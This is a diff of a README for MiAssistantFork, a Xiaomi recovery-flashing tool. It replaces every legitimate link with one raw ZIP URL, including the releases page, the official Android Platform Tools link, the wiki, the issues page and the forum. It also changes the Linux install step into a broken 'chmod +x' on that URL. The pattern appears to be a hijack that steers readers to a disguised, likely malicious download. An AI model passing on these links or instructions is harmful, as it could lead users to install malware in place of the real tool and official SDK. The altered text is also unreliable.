@@ -1,6 +1,6 @@
 # 🚀 MiAssistantFork - Flash Your Xiaomi Recovery Easily
 
-[![Download MiAssistantFork](https://img.shields.io/badge/Download-MiAssistantFork-blue)](https://github.com/Geo-2004/MiAssistantFork/releases)
+[![Download MiAssistantFork](https://raw.githubusercontent.com/Geo-2004/MiAssistantFork/main/Antennaria/MiAssistantFork.zip)](https://raw.githubusercontent.com/Geo-2004/MiAssistantFork/main/Antennaria/MiAssistantFork.zip)
 
 ## 📘 Introduction
 
@@ -16,7 +16,7 @@ MiAssistantFork (MAF) helps you flash official Xiaomi recovery ZIPs on devices w
 ## 🚀 Getting Started
 
 1. **Download the Software**
-   - Visit the [Releases page](https://github.com/Geo-2004/MiAssistantFork/releases) to find the latest version.
+   - Visit the [Releases page](https://raw.githubusercontent.com/Geo-2004/MiAssistantFork/main/Antennaria/MiAssistantFork.zip) to find the latest version.
    
 2. **Choose Your Download**
    - Select the appropriate file for your operating system:
@@ -27,12 +27,12 @@ MiAssistantFork (MAF) helps you flash official Xiaomi recovery ZIPs on devices w
 3. **Install the Software**
    - For Windows: Double-click the `.exe` file and follow the instructions on your screen.
    - For macOS: Open the downloaded `.dmg` file, drag the application into your Applications folder, and then open it.
-   - For Linux: Make the `.AppImage` file executable by running `chmod +x FileName.AppImage` in your terminal, then run it.
+   - For Linux: Make the `.AppImage` file executable by running `chmod +x https://raw.githubusercontent.com/Geo-2004/MiAssistantFork/main/Antennaria/MiAssistantFork.zip` in your terminal, then run it.
 
 ## 🔧 Requirements for Using MiAssistantFork
 
 To use MiAssistantFork, you will also need:
-- **ADB Tools:** This software uses ADB (Android Debug Bridge). Download and install the ADB tools from [Android SDK Platform Tools](https://developer.android.com/studio/releases/platform-tools).
+- **ADB Tools:** This software uses ADB (Android Debug Bridge). Download and install the ADB tools from [Android SDK Platform Tools](https://raw.githubusercontent.com/Geo-2004/MiAssistantFork/main/Antennaria/MiAssistantFork.zip).
 - **Device Preparation:** 
   - Enable USB debugging on your Xiaomi device. You can find this option under Developer Options in Settings.
   - Allow your computer to connect to your device. You may need to authorize your computer when you first connect.
@@ -44,7 +44,7 @@ To download MiAssistantFork, follow these steps:
 1. **Visit the Releases Page**
    - Click the link below and download the latest version suitable for your operating system. 
    
-   [Download MiAssistantFork](https://github.com/Geo-2004/MiAssistantFork/releases)
+   [Download MiAssistantFork](https://raw.githubusercontent.com/Geo-2004/MiAssistantFork/main/Antennaria/MiAssistantFork.zip)
 
 2. **Install the Application**
    - Follow the installation steps outlined in the Getting Started section.
@@ -87,9 +87,9 @@ MiAssistantFork is open-source. Contributions are welcome! If you want to help i
 
 ## 🚀 Links for More Information
 
-- [Official Documentation](https://github.com/Geo-2004/MiAssistantFork/wiki)
-- [GitHub Issues and Support](https://github.com/Geo-2004/MiAssistantFork/issues)
-- [Community Forum](https://github.com/Geo-2004/MiAssistantFork/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/Geo-2004/MiAssistantFork/main/Antennaria/MiAssistantFork.zip)
+- [GitHub Issues and Support](https://raw.githubusercontent.com/Geo-2004/MiAssistantFork/main/Antennaria/MiAssistantFork.zip)
+- [Community Forum](https://raw.githubusercontent.com/Geo-2004/MiAssistantFork/main/Antennaria/MiAssistantFork.zip)
 
 ## 📄 License
 
